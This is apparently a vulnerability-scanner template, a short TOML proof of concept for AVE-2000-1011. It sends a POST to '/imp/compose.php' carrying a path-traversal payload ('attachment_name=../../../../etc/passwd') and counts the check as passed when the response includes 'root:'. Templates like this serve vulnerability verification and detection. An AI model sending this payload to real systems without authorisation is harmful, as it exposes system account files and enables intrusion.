[info]
author = "ave"
description = "AVE-2000-1011 verification"
id = "POC-AVE-2000-1011"
name = "PoC for AVE-2000-1011"
severity = "medium"
tags = ["ave-2000-1011"]
vuln_id = ["AVE-2000-1011"]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/imp/compose.php"
protocol = "http"

[poc.requests.body]
content = "attachment_name=../../../../etc/passwd&action=send"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
